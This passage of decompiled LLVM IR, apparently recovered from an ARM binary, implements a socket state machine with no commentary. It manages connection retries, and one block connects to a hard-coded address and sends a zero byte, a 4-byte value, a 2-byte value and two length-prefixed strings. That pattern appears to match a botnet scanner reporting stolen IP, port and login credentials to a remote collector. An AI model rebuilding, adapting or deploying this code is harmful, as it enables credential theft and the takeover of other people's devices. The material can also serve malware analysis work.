  %.367 = zext i1 %v7_11ee8 to i32
  store i32 %.367, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11ef4 = icmp eq i32 %v0_11ee4, 0
  store i1 %v2_11ef4, i1* %cpsr_z.global-to-local, align 1
  %tmp359 = icmp slt i32 %v0_11ee4, 1
  br i1 %tmp359, label %bb360, label %.thread83

.thread83:                                        ; preds = %dec_label_pc_11ec0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11f08

bb360:                                            ; preds = %dec_label_pc_11ec0
  store i32 %.367, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11f00 = icmp eq i1 %v7_11ee8, false
  store i1 %v2_11f00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11f00, label %dec_label_pc_12030, label %dec_label_pc_11f08

dec_label_pc_11f08:                               ; preds = %.thread83, %bb360
  %v0_11f08 = load i32, i32* @r5, align 4
  %v1_11f08 = add i32 %v0_11f08, 4
  %v2_11f08 = inttoptr i32 %v1_11f08 to i32*
  %v3_11f08 = load i32, i32* %v2_11f08, align 4
  store i32 %v3_11f08, i32* %r0.global-to-local, align 4
  %v1_11f0c = call i32 @close(i32 %v3_11f08)
  store i32 %v1_11f0c, i32* %r0.global-to-local, align 4
  %v0_11f10 = load i32, i32* @r5, align 4
  %v1_11f10 = add i32 %v0_11f10, 24
  %v2_11f10 = inttoptr i32 %v1_11f10 to i32*
  %v3_11f10 = load i32, i32* %v2_11f10, align 4
  store i32 %v3_11f10, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11f18 = load i32, i32* @r4, align 4
  %v2_11f18 = add i32 %v0_11f10, 4
  %v3_11f18 = inttoptr i32 %v2_11f18 to i32*
  store i32 %v0_11f18, i32* %v3_11f18, align 4
  %v0_11f1c = load i32, i32* %r2.global-to-local, align 4
  %v1_11f1c = load i32, i32* @r5, align 4
  %v2_11f1c = add i32 %v1_11f1c, 12
  %v3_11f1c = inttoptr i32 %v2_11f1c to i32*
  store i32 %v0_11f1c, i32* %v3_11f1c, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11f24:                               ; preds = %dec_label_pc_11620
  br i1 %v2_11644, label %dec_label_pc_120e4, label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %dec_label_pc_11f24
  %v3_11f28 = icmp eq i32 %v5_11640, -1
  store i1 %v3_11f28, i1* %cpsr_c.global-to-local, align 1
  %v8_11f28 = icmp eq i32 %v5_11640, -1
  store i1 %v8_11f28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11f28, label %dec_label_pc_11f30, label %dec_label_pc_1166c

dec_label_pc_11f30:                               ; preds = %dec_label_pc_11f28
  %v0_11f30 = load i32, i32* @sb, align 4
  %v1_11f30 = inttoptr i32 %v0_11f30 to i32*
  %v2_11f30 = load i32, i32* %v1_11f30, align 4
  store i32 %v2_11f30, i32* %r3.global-to-local, align 4
  %v2_11f34 = icmp ugt i32 %v2_11f30, 10
  store i1 %v2_11f34, i1* %cpsr_c.global-to-local, align 1
  %v7_11f34 = icmp eq i32 %v2_11f30, 11
  store i1 %v7_11f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11f34, label %dec_label_pc_11454, label %dec_label_pc_11f3c

dec_label_pc_11f3c:                               ; preds = %dec_label_pc_11f30, %dec_label_pc_120e4
  %v0_11f3c = load i32, i32* @r5, align 4
  %v1_11f3c = add i32 %v0_11f3c, 4
  %v2_11f3c = inttoptr i32 %v1_11f3c to i32*
  %v3_11f3c = load i32, i32* %v2_11f3c, align 4
  store i32 %v3_11f3c, i32* %r0.global-to-local, align 4
  %v1_11f40 = call i32 @close(i32 %v3_11f3c)
  store i32 %v1_11f40, i32* %r0.global-to-local, align 4
  %v0_11f44 = load i32, i32* @r5, align 4
  %v1_11f44 = add i32 %v0_11f44, 284
  %v2_11f44 = inttoptr i32 %v1_11f44 to i8*
  %v3_11f44 = load i8, i8* %v2_11f44, align 1
  %v4_11f44 = zext i8 %v3_11f44 to i32
  %v1_11f48 = add nuw nsw i32 %v4_11f44, 1
  %v1_11f4c = urem i32 %v1_11f48, 256
  store i32 %v1_11f4c, i32* %r3.global-to-local, align 4
  %v2_11f50 = icmp ugt i32 %v1_11f4c, 8
  store i1 %v2_11f50, i1* %cpsr_c.global-to-local, align 1
  %v7_11f50 = icmp eq i32 %v1_11f4c, 9
  store i1 %v7_11f50, i1* %cpsr_z.global-to-local, align 1
  %v2_11f54 = xor i1 %v7_11f50, true
  %v3_11f54 = and i1 %v2_11f50, %v2_11f54
  br i1 %v3_11f54, label %bb361, label %bb362

bb361:                                            ; preds = %dec_label_pc_11f3c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb362

bb362:                                            ; preds = %dec_label_pc_11f3c, %bb361
  store i32 -1, i32* @r4, align 4
  %v1_11f5c = trunc i32 %v1_11f48 to i8
  store i8 %v1_11f5c, i8* %v2_11f44, align 1
  %v0_11f60 = load i32, i32* @r4, align 4
  %v1_11f60 = load i32, i32* @r5, align 4
  %v2_11f60 = add i32 %v1_11f60, 4
  %v3_11f60 = inttoptr i32 %v2_11f60 to i32*
  store i32 %v0_11f60, i32* %v3_11f60, align 4
  %v0_11f64 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11f64 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_11f64 = xor i1 %v1_11f64, true
  %v3_11f64 = and i1 %v0_11f64, %v2_11f64
  br i1 %v3_11f64, label %bb363, label %.thread229

bb363:                                            ; preds = %bb362
  %v4_11f64 = load i32, i32* %r0.global-to-local, align 4
  %v5_11f64 = load i32, i32* @r5, align 4
  %v6_11f64 = add i32 %v5_11f64, 12
  %v7_11f64 = inttoptr i32 %v6_11f64 to i32*
  store i32 %v4_11f64, i32* %v7_11f64, align 4
  %v4_11f68 = load i32, i32* %r0.global-to-local, align 4
  %v5_11f68 = trunc i32 %v4_11f68 to i8
  %v6_11f68 = load i32, i32* @r5, align 4
  %v7_11f68 = add i32 %v6_11f68, 284
  %v8_11f68 = inttoptr i32 %v7_11f68 to i8*
  store i8 %v5_11f68, i8* %v8_11f68, align 1
  %v0_11f6c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_11f6c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread229

.thread229:                                       ; preds = %bb362, %bb363
  %v1_11f6c = phi i1 [ %v1_11f6c.pre, %bb363 ], [ %v1_11f64, %bb362 ]
  %v0_11f6c = phi i1 [ %v0_11f6c.pre, %bb363 ], [ %v0_11f64, %bb362 ]
  %v2_11f6c = xor i1 %v1_11f6c, true
  %v3_11f6c = and i1 %v0_11f6c, %v2_11f6c
  br i1 %v3_11f6c, label %dec_label_pc_11454, label %dec_label_pc_11f70

dec_label_pc_11f70:                               ; preds = %.thread229
  %v0_11f70 = load i32, i32* @r5, align 4
  store i32 %v0_11f70, i32* @r0, align 4
  %v0_11f74 = call i32 @function_10744()
  store i32 %v0_11f74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11454

dec_label_pc_11f7c:                               ; preds = %dec_label_pc_11dec
  store i32 %v2_11dbc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_11f8c = add i32 %v0_11dd8, 4
  %v2_11f8c = inttoptr i32 %v1_11f8c to i32*
  %v3_11f8c = load i32, i32* %v2_11f8c, align 4
  store i32 %v3_11f8c, i32* %r0.global-to-local, align 4
  %v5_11f90 = call i32 @send(i32 %v3_11f8c, i32* nonnull %stack_var_-41, i32 3, i32 16384)
  store i32 %v5_11f90, i32* %r0.global-to-local, align 4
  store i32 %v2_113e8, i32* %r1.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r5, align 4
  %v1_11f98 = add i32 %v0_11f98, 4
  %v2_11f98 = inttoptr i32 %v1_11f98 to i32*
  %v3_11f98 = load i32, i32* %v2_11f98, align 4
  store i32 %v3_11f98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11760

dec_label_pc_11fa8:                               ; preds = %dec_label_pc_11610
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_11fb0 = add i32 %v0_11fa8, 92
  store i32 %v1_11fb0, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_11fb8 = inttoptr i32 %.pre to i32*
  %v4_11fb8 = inttoptr i32 %v1_11fb0 to i32*
  %v5_11fb8 = call i32* @memmove(i32* %v3_11fb8, i32* %v4_11fb8, i32 192)
  %v7_11fb8 = ptrtoint i32* %v5_11fb8 to i32
  store i32 %v7_11fb8, i32* %r0.global-to-local, align 4
  %v0_11fbc = load i32, i32* @r5, align 4
  %v1_11fbc = add i32 %v0_11fbc, 24
  %v2_11fbc = inttoptr i32 %v1_11fbc to i32*
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  store i32 %v3_11fbc, i32* %r3.global-to-local, align 4
  %v1_11fc0 = add i32 %v3_11fbc, -64
  store i32 %v1_11fc0, i32* %ip.global-to-local, align 4
  store i32 %v1_11fc0, i32* %v2_11fbc, align 4
  br label %dec_label_pc_11620

dec_label_pc_11fcc:                               ; preds = %dec_label_pc_11c90
  %v0_11fcc = load i32, i32* @r5, align 4
  store i32 %v0_11fcc, i32* @r0, align 4
  %v0_11fd0 = call i32 @function_10744()
  store i32 %v0_11fd0, i32* %r0.global-to-local, align 4
  %v0_11fd4 = load i32, i32* @r5, align 4
  %v1_11fd4 = add i32 %v0_11fd4, 24
  %v2_11fd4 = inttoptr i32 %v1_11fd4 to i32*
  %v3_11fd4 = load i32, i32* %v2_11fd4, align 4
  store i32 %v3_11fd4, i32* %ip.global-to-local, align 4
  %v0_11fd8 = load i32, i32* @r4, align 4
  store i32 %v0_11fd8, i32* @r7, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11fe0:                               ; preds = %thread-pre-split80
  %v0_11fe8 = load i32, i32* @r5, align 4
  %v1_11fe8 = add i32 %v0_11fe8, 12
  %v2_11fe8 = inttoptr i32 %v1_11fe8 to i32*
  %v3_11fe8 = load i32, i32* %v2_11fe8, align 4
  br label %dec_label_pc_11608.backedge

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_1158c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_11ff0 = load i32, i32* %stack_var_-56, align 4
  %v0_11ff4 = load i32, i32* @r6, align 4
  store i32 %v0_11ff4, i32* %r2.global-to-local, align 4
  %v1_11ff8 = add i32 %v3_11ff0, -1
  store i32 %v1_11ff8, i32* %r3.global-to-local, align 4
  %v0_11ffc = load i32, i32* @sl, align 4
  store i32 %v0_11ffc, i32* %r0.global-to-local, align 4
  %v0_12000 = load i32, i32* @r5, align 4
  %v1_12000 = add i32 %v0_12000, 24
  %v2_12000 = inttoptr i32 %v1_12000 to i32*
  %v3_12000 = load i32, i32* %v2_12000, align 4
  store i32 %v3_12000, i32* %r1.global-to-local, align 4
  %v4_12004 = call i32 @function_12df8(i32 %v0_11ffc, i32 %v3_12000, i32 %v0_11ff4, i32 %v1_11ff8)
  store i32 %v4_12004, i32* %r0.global-to-local, align 4
  %v2_12008 = icmp eq i32 %v4_12004, -1
  store i1 %v2_12008, i1* %cpsr_c.global-to-local, align 1
  %v7_12008 = icmp eq i32 %v4_12004, -1
  store i1 %v7_12008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12008, label %dec_label_pc_12018, label %dec_label_pc_115ec

dec_label_pc_12018:                               ; preds = %dec_label_pc_11ff0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_1201c = call i32 @function_121c8(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_12024 = call i32 @function_121c8(i32 33)
  store i32 %v1_12024, i32* %r0.global-to-local, align 4
  %v0_12028 = load i32, i32* @r5, align 4
  %v1_12028 = add i32 %v0_12028, 12
  %v2_12028 = inttoptr i32 %v1_12028 to i32*
  %v3_12028 = load i32, i32* %v2_12028, align 4
  br label %dec_label_pc_11608.backedge

dec_label_pc_11608.backedge.thread:               ; preds = %dec_label_pc_118c8, %dec_label_pc_1197c, %dec_label_pc_11aec, %dec_label_pc_11ba0, %dec_label_pc_11cfc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11610

dec_label_pc_11608.backedge.thread465:            ; preds = %dec_label_pc_118f4, %dec_label_pc_11a64, %dec_label_pc_11bcc, %dec_label_pc_11b18, %dec_label_pc_11d28, %dec_label_pc_11910, %dec_label_pc_11a80, %dec_label_pc_11b34, %dec_label_pc_11be8, %dec_label_pc_11d44
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11610

dec_label_pc_11608.backedge:                      ; preds = %dec_label_pc_12018, %dec_label_pc_11fe0
  %storemerge468 = phi i32 [ %v3_11fe8, %dec_label_pc_11fe0 ], [ %v3_12028, %dec_label_pc_12018 ]
  %v0_11608.be = phi i32 [ %v3_11fe8, %dec_label_pc_11fe0 ], [ %v3_12028, %dec_label_pc_12018 ]
  %v0_11610144 = phi i32 [ %v0_11fe8, %dec_label_pc_11fe0 ], [ %v0_12028, %dec_label_pc_12018 ]
  store i32 %storemerge468, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11608 = icmp eq i32 %v0_11608.be, 0
  store i1 %v2_11608, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11608, label %dec_label_pc_11454, label %dec_label_pc_11610

dec_label_pc_12030:                               ; preds = %bb360
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_1203c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1203c, i32* %r0.global-to-local, align 4
  %v2_12040 = icmp eq i32 %v3_1203c, -1
  store i1 %v2_12040, i1* %cpsr_c.global-to-local, align 1
  %v7_12040 = icmp eq i32 %v3_1203c, -1
  store i1 %v7_12040, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_1203c, i32* @r4, align 4
  br i1 %v7_12040, label %dec_label_pc_12194, label %dec_label_pc_1204c

dec_label_pc_1204c:                               ; preds = %dec_label_pc_12030
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_12050 = call i32 @function_12280(i32 4)
  store i32 1503156639, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (%sockaddr** @global_var_1c224.158 to i32), i32* %r3.global-to-local, align 4
  %v0_1205c = load i32, i32* @r6, align 4
  store i32 %v0_1205c, i32* %r1.global-to-local, align 4
  store i32 1503156639, i32* @global_var_1c228.160, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v2_12068 = inttoptr i32 %v0_1205c to i32*
  %v3_12068 = call i32 @function_1219c(i32 4, i32* %v2_12068)
  %v4_12068 = inttoptr i32 %v3_12068 to i8*
  store i32 %v3_12068, i32* %r0.global-to-local, align 4
  %v2_1206c = add i32 %v3_12068, 1
  %v3_1206c = inttoptr i32 %v2_1206c to i8*
  %v4_1206c = load i8, i8* %v3_1206c, align 1
  %v5_1206c = zext i8 %v4_1206c to i32
  store i32 %v5_1206c, i32* %r2.global-to-local, align 4
  %v3_12070 = load i8, i8* %v4_12068, align 1
  %v4_12070 = zext i8 %v3_12070 to i32
  %v4_12074 = mul nuw nsw i32 %v5_1206c, 256
  %v5_12074 = or i32 %v4_12070, %v4_12074
  store i32 %v5_12074, i32* %r3.global-to-local, align 4
  %v1_12078 = and i32 %v4_12070, 128
  %v2_12078 = icmp ne i32 %v1_12078, 0
  store i1 %v2_12078, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_1206c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_12088 = call i32 @function_121c8(i32 4)
  %v0_1208c = load i32, i32* @r4, align 4
  store i32 %v0_1208c, i32* %r0.global-to-local, align 4
  store i32 %v2_11090, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v5_12098 = call i32 @connect(i32 %v0_1208c, %sockaddr* %tmp287, i32 16)
  store i32 %v5_12098, i32* %r0.global-to-local, align 4
  %v3_1209c = icmp eq i32 %v5_12098, -1
  store i1 %v3_1209c, i1* %cpsr_c.global-to-local, align 1
  %v8_1209c = icmp eq i32 %v5_12098, -1
  store i1 %v8_1209c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1209c, label %dec_label_pc_120a4, label %dec_label_pc_120f0

dec_label_pc_120a4:                               ; preds = %dec_label_pc_1204c
  %v0_120a4 = load i32, i32* @r4, align 4
  store i32 %v0_120a4, i32* %r0.global-to-local, align 4
  %v1_120a8 = call i32 @close(i32 %v0_120a4)
  %v0_120ac = load i32, i32* @r6, align 4
  store i32 %v0_120ac, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_120ac)
  unreachable

dec_label_pc_120b4:                               ; preds = %dec_label_pc_113b0, %dec_label_pc_11394
  %v0_120b4 = load i32, i32* @r7, align 4
  %v1_120b4 = load i32, i32* @r4, align 4
  %v2_120b4 = add i32 %v1_120b4, 12
  %v3_120b4 = inttoptr i32 %v2_120b4 to i32*
  store i32 %v0_120b4, i32* %v3_120b4, align 4
  %v0_120b8 = load i32, i32* @r7, align 4
  %v1_120b8 = trunc i32 %v0_120b8 to i8
  %v2_120b8 = load i32, i32* @r4, align 4
  %v3_120b8 = add i32 %v2_120b8, 284
  %v4_120b8 = inttoptr i32 %v3_120b8 to i8*
  store i8 %v1_120b8, i8* %v4_120b8, align 1
  br label %bb325

dec_label_pc_120c0:                               ; preds = %dec_label_pc_1153c, %dec_label_pc_114f4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11578

dec_label_pc_120c8:                               ; preds = %dec_label_pc_114b4
  %v0_120c8 = load i32, i32* @r5, align 4
  %v1_120c8 = add i32 %v0_120c8, 4
  %v2_120c8 = inttoptr i32 %v1_120c8 to i32*
  %v3_120c8 = load i32, i32* %v2_120c8, align 4
  store i32 %v3_120c8, i32* %r0.global-to-local, align 4
  %v1_120cc = call i32 @close(i32 %v3_120c8)
  store i32 %v1_120cc, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_120d4 = load i32, i32* @r6, align 4
  %v1_120d4 = load i32, i32* @r5, align 4
  %v2_120d4 = add i32 %v1_120d4, 12
  %v3_120d4 = inttoptr i32 %v2_120d4 to i32*
  store i32 %v0_120d4, i32* %v3_120d4, align 4
  %v0_120d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_120d8 = load i32, i32* @r5, align 4
  %v2_120d8 = add i32 %v1_120d8, 4
  %v3_120d8 = inttoptr i32 %v2_120d8 to i32*
  store i32 %v0_120d8, i32* %v3_120d8, align 4
  %v0_120dc = load i32, i32* @r6, align 4
  %v1_120dc = trunc i32 %v0_120dc to i8
  %v2_120dc = load i32, i32* @r5, align 4
  %v3_120dc = add i32 %v2_120dc, 284
  %v4_120dc = inttoptr i32 %v3_120dc to i8*
  store i8 %v1_120dc, i8* %v4_120dc, align 1
  br label %dec_label_pc_11454

dec_label_pc_120e4:                               ; preds = %dec_label_pc_11f24
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_120e8 = load i32, i32* @sb, align 4
  %v2_120e8 = inttoptr i32 %v1_120e8 to i32*
  store i32 104, i32* %v2_120e8, align 4
  br label %dec_label_pc_11f3c

dec_label_pc_120f0:                               ; preds = %dec_label_pc_1204c
  store i32 %v2_115a0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12100 = load i32, i32* @r4, align 4
  store i32 %v0_12100, i32* %r0.global-to-local, align 4
  %v0_12104 = load i32, i32* @r6, align 4
  %v6_12104 = trunc i32 %v0_12104 to i8
  store i8 %v6_12104, i8* %stack_var_-52, align 1
  %v7_12108 = call i32 @send(i32 %v0_12100, i32* nonnull %v2_115a8, i32 1, i32 16384)
  store i32 %v2_115b4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1211c = load i32, i32* @r4, align 4
  store i32 %v0_1211c, i32* %r0.global-to-local, align 4
  %v5_12120 = call i32 @send(i32 %v0_1211c, i32* nonnull %stack_var_-56, i32 4, i32 16384)
  %v2_12128 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_12128, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12134 = load i32, i32* @r4, align 4
  store i32 %v0_12134, i32* %r0.global-to-local, align 4
  %v5_12138 = call i32 @send(i32 %v0_12134, i32* nonnull %stack_var_-38, i32 2, i32 16384)
  %v0_1213c = load i32, i32* %r8.global-to-local, align 4
  %v1_1213c = add i32 %v0_1213c, 12
  store i32 %v1_1213c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12148 = load i32, i32* @r4, align 4
  store i32 %v0_12148, i32* %r0.global-to-local, align 4
  %v4_1214c = inttoptr i32 %v1_1213c to i32*
  %v5_1214c = call i32 @send(i32 %v0_12148, i32* %v4_1214c, i32 1, i32 16384)
  store i32 %v5_1214c, i32* %r0.global-to-local, align 4
  %v0_12150 = load i32, i32* %r8.global-to-local, align 4
  %v1_12150 = inttoptr i32 %v0_12150 to i32*
  %v2_12150 = load i32, i32* %v1_12150, align 4
  store i32 %v2_12150, i32* %r1.global-to-local, align 4
  %v1_12154 = add i32 %v0_12150, 12
  %v2_12154 = inttoptr i32 %v1_12154 to i8*
  %v3_12154 = load i8, i8* %v2_12154, align 1
  %v4_12154 = zext i8 %v3_12154 to i32
  store i32 %v4_12154, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_1215c = load i32, i32* @r4, align 4
  store i32 %v0_1215c, i32* %r0.global-to-local, align 4
  %v4_12160 = inttoptr i32 %v2_12150 to i32*
  %v5_12160 = call i32 @send(i32 %v0_1215c, i32* %v4_12160, i32 %v4_12154, i32 16384)
  %v0_12164 = load i32, i32* %r8.global-to-local, align 4
  %v1_12164 = add i32 %v0_12164, 13
  store i32 %v1_12164, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12170 = load i32, i32* @r4, align 4
  store i32 %v0_12170, i32* %r0.global-to-local, align 4
  %v4_12174 = inttoptr i32 %v1_12164 to i32*
  %v5_12174 = call i32 @send(i32 %v0_12170, i32* %v4_12174, i32 1, i32 16384)
  %v0_12178 = load i32, i32* @r4, align 4
  store i32 %v0_12178, i32* %r0.global-to-local, align 4
  %v0_1217c = load i32, i32* %r8.global-to-local, align 4
  %v1_1217c = add i32 %v0_1217c, 13
  %v2_1217c = inttoptr i32 %v1_1217c to i8*
  %v3_1217c = load i8, i8* %v2_1217c, align 1
  %v4_1217c = zext i8 %v3_1217c to i32
  store i32 %v4_1217c, i32* %r2.global-to-local, align 4
  %v1_12180 = add i32 %v0_1217c, 4
  %v2_12180 = inttoptr i32 %v1_12180 to i32*
  %v3_12180 = load i32, i32* %v2_12180, align 4
  store i32 %v3_12180, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_12188 = inttoptr i32 %v3_12180 to i32*
  %v5_12188 = call i32 @send(i32 %v0_12178, i32* %v4_12188, i32 %v4_1217c, i32 16384)
  %v0_1218c = load i32, i32* @r4, align 4
  store i32 %v0_1218c, i32* %r0.global-to-local, align 4
  %v1_12190 = call i32 @close(i32 %v0_1218c)
  store i32 %v1_12190, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_12030, %dec_label_pc_120f0
  %v0_12194 = load i32, i32* @r6, align 4
  store i32 %v0_12194, i32* %r0.global-to-local, align 4
  call void @exit(i32 %v0_12194)
  unreachable

; uselistorder directives
  uselistorder i32 %v4_12070, { 1, 0 }
  uselistorder i32 %v5_1206c, { 1, 0, 2 }
  uselistorder i1 %v7_12040, { 1, 0 }
  uselistorder i32 %v3_1203c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12028, { 1, 0 }
  uselistorder i1 %v7_12008, { 1, 0 }
  uselistorder i32 %v3_11fe8, { 1, 0 }
  uselistorder i1 %v1_11f64, { 1, 0 }
  uselistorder i32 %v1_11f4c, { 2, 1, 0 }
  uselistorder i32 %v1_11f48, { 1, 0 }
  uselistorder i1 %v2_11f00, { 1, 0 }
  uselistorder i32 %.367, { 1, 0 }
  uselistorder i1 %v7_11ee8, { 1, 0 }
  uselistorder i32 %v0_11ee4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11ec4, { 1, 0, 2 }
  uselistorder i32 %v4_11ec0, { 1, 0, 2 }
  uselistorder i1 %v7_11eb0, { 1, 0 }
  uselistorder i32 %v0_11eb0, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v0_11e60, { 0, 2, 1 }
  uselistorder i1 %v0_11e50, { 1, 0 }
  uselistorder i32 %v4_11e44, { 1, 0, 2 }
  uselistorder i32 %v0_11dd8, { 1, 2, 0 }
  uselistorder i1 %v7_11d48, { 1, 0 }
  uselistorder i32 %v1_11d44, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11d3c, { 1, 0 }
  uselistorder i8 %v3_11d34, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11d44, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11d20, { 1, 0 }
  uselistorder i1 %v7_11d18, { 1, 0 }
  uselistorder i1 %v7_11d10, { 1, 0 }
  uselistorder i32 %v0_11cec, { 1, 2, 0 }
  uselistorder i32 %v2_11cd8, { 1, 0 }
  uselistorder i32 %v1_11cd8, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_11cd8, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i32 %v1_11ca8, { 2, 1, 0 }
  uselistorder i1 %v7_11c84, { 1, 0 }
  uselistorder i32 %v4_11c80, { 1, 0, 2 }
  uselistorder i1 %v7_11bec, { 1, 0 }
  uselistorder i32 %v1_11be8, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11be0, { 1, 0 }
  uselistorder i8 %v3_11bd8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11be8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11bc4, { 1, 0 }
  uselistorder i1 %v7_11bbc, { 1, 0 }
  uselistorder i1 %v7_11bb4, { 1, 0 }
  uselistorder i1 %v7_11b38, { 1, 0 }
  uselistorder i32 %v1_11b34, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11b2c, { 1, 0 }
  uselistorder i8 %v3_11b24, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11b34, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11b10, { 1, 0 }
  uselistorder i1 %v7_11b08, { 1, 0 }
  uselistorder i1 %v7_11b00, { 1, 0 }
  uselistorder i1 %v7_11a84, { 1, 0 }
  uselistorder i32 %v1_11a80, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11a78, { 1, 0 }
  uselistorder i8 %v3_11a70, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11a80, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11a5c, { 1, 0 }
  uselistorder i1 %v7_11a54, { 1, 0 }
  uselistorder i1 %v7_11a4c, { 1, 0 }
  uselistorder i1 %v7_11914, { 1, 0 }
  uselistorder i32 %v1_11910, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_11908, { 1, 0 }
  uselistorder i8 %v3_11900, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11910, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_118ec, { 1, 0 }
  uselistorder i1 %v7_118e4, { 1, 0 }
  uselistorder i1 %v7_118dc, { 1, 0 }
  uselistorder i32 %v0_11884, { 2, 1, 0 }
  uselistorder i1 %v7_1187c, { 1, 0 }
  uselistorder i1 %v8_11870, { 1, 0 }
  uselistorder i8 %v3_11868, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_11878, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_11854, { 1, 0 }
  uselistorder i1 %v7_1184c, { 1, 0 }
  uselistorder i32 %v0_117f4, { 2, 1, 0 }
  uselistorder i1 %v7_117ec, { 1, 0 }
  uselistorder i1 %v8_117e0, { 1, 0 }
  uselistorder i8 %v3_117d8, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_117e8, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_117c4, { 1, 0 }
  uselistorder i1 %v7_117bc, { 1, 0 }
  uselistorder i1 %v7_117b4, { 1, 0 }
  uselistorder i32 %v0_11790.pre, { 0, 2, 1 }
